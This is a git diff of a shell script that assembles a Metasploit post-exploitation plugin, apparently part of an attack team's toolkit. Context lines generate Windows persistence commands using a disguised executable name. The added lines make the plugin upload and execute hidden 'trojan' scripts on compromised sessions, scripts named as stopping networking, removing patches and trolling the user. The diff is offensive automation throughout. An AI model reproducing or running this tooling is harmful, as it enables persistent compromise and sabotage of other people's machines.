@@ -76,6 +76,22 @@ echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run pers
 #echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run post\/windows\/manage\/persistence LPORT='$TS_TEAM_PORT_HTTPS' DELAY=1 STARTUP=USER HANDLER=false REXENAME=dsfsvc.exe PAYLOAD_TYPE=HTTPS LHOST=/g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
 #echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run post\/windows\/manage\/persistence LPORT='$TS_TEAM_PORT_HTTPS' DELAY=1 STARTUP=SYSTEM HANDLER=false REXENAME=dsfsvc.exe PAYLOAD_TYPE=HTTPS LHOST=/g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
 #echo $TS_TEAM_MATES | sed -e 's/;/\n/g' | sed -e 's/^/session.run_cmd(\"run post\/windows\/manage\/persistence LPORT='$TS_TEAM_PORT_HTTPS' DELAY=1 STARTUP=SERVICE HANDLER=false REXENAME=dsfsvc.exe PAYLOAD_TYPE=HTTPS LHOST=/g' -e 's/$/\")/g' | tr '"' "'" >> .msf/plugins/.autopost.source.persistence
+
+echo > .msf/plugins/.autopost.source.trojans
+if [ $TS_NETSTOPPER == 1 ]; then
+	echo "session.run_cmd('upload ./.trojans/netstopper.cmd .')" >> .msf/plugins/.autopost.source.trojans
+	echo "session.run_cmd('execute -H -f netstopper.cmd')" >> .msf/plugins/.autopost.source.trojans
+fi
+if [ $TS_UNPATCHER == 1 ]; then
+	echo "session.run_cmd('upload ./.trojans/unpatch.cmd .')" >> .msf/plugins/.autopost.source.trojans
+	echo "session.run_cmd('execute -H -f unpatch.cmd')" >> .msf/plugins/.autopost.source.trojans
+fi
+if [ $TS_TROLLWARE == 1 ]; then
+	echo "session.run_cmd('upload ./.trojans/wintroll.cmd .')" >> .msf/plugins/.autopost.source.trojans
+	echo "session.run_cmd('upload ./.trojans/wallpaper.bmp .')" >> .msf/plugins/.autopost.source.trojans
+	echo "session.run_cmd('execute -H -f wintroll.cmd')" >> .msf/plugins/.autopost.source.trojans
+fi
+
 TS_LOOT_DIR_DEL=`echo $TS_LOOT_DIR | sed -e 's/\//||/g'`
 if [ $TS_TARGET_SOLO == 0 ]; then
 	sed '/#!TS_AUTOPOST_AUTOTARGET!#/ r .msf/plugins/.autopost.source.autotarget' .msf/plugins/.autopost.source.general > /tmp/autopost.rb.autotarget
@@ -87,7 +103,8 @@ sed '/#!TS_AUTOPOST_WINDOWS!#/ r .msf/plugins/.autopost.source.windows' /tmp/aut
 sed '/#!TS_AUTOPOST_LINUX!#/ r .msf/plugins/.autopost.source.linux' /tmp/autopost.rb.windows > /tmp/autopost.rb.linux
 sed '/#!TS_AUTOPOST_OSX!#/ r .msf/plugins/.autopost.source.osx' /tmp/autopost.rb.linux > /tmp/autopost.rb.oxs
 sed '/#!TS_AUTOPOST_PERSISTENCE!#/ r .msf/plugins/.autopost.source.persistence' /tmp/autopost.rb.oxs > /tmp/autopost.rb.persistence
-sed -e 's/#!TS_AUTOPOST_GENERAL!#//g' -e 's/#!TS_AUTOPOST_WINDOWS!#//g' -e 's/#!TS_AUTOPOST_LINUX!#//g' -e 's/#!TS_AUTOPOST_OSX!#//g' -e 's/#!TS_AUTOPOST_PERSISTENCE!#//g' -e 's/#!TS_AUTOPOST_AUTOTARGET!#//g' /tmp/autopost.rb.persistence > /tmp/autopost.rb.full
+sed '/#!TS_AUTOPOST_TROJANS!#/ r .msf/plugins/.autopost.source.trojans' /tmp/autopost.rb.persistence > /tmp/autopost.rb.trojans
+sed -e 's/#!TS_AUTOPOST_GENERAL!#//g' -e 's/#!TS_AUTOPOST_WINDOWS!#//g' -e 's/#!TS_AUTOPOST_LINUX!#//g' -e 's/#!TS_AUTOPOST_OSX!#//g' -e 's/#!TS_AUTOPOST_PERSISTENCE!#//g' -e 's/#!TS_AUTOPOST_TROJANS!#//g' -e 's/#!TS_AUTOPOST_AUTOTARGET!#//g' /tmp/autopost.rb.trojans > /tmp/autopost.rb.full
 sed -e 's/#!TS_LOOT_DIR!#/'$TS_LOOT_DIR_DEL'/g' -e 's/||/\//g' /tmp/autopost.rb.full > /tmp/autopost.rb.final
 sed -e 's/#!TS_AUTOPOST_OUTPUT!#/'$TS_AUTOPOST_OUTPUT'/g' -e 's/#!TS_TEAM_MATES!#/'$TS_TEAM_MATES'/g' -e 's/#!TS_TEAM_PORT!#/'$TS_TEAM_PORT'/g' -e 's/#!TS_ADMIN_USER!#/'$TS_ADMIN_USER'/g' -e 's/#!TS_ADMIN_PASS!#/'$TS_ADMIN_PASS'/g' /tmp/autopost.rb.final > ./.msf/plugins/autopost.rb
 cat .msf/plugins/autopost.rb | grep -vf .msf/plugins/.autopost.source.autotarget > .msf/plugins/autopost_notrg.rb
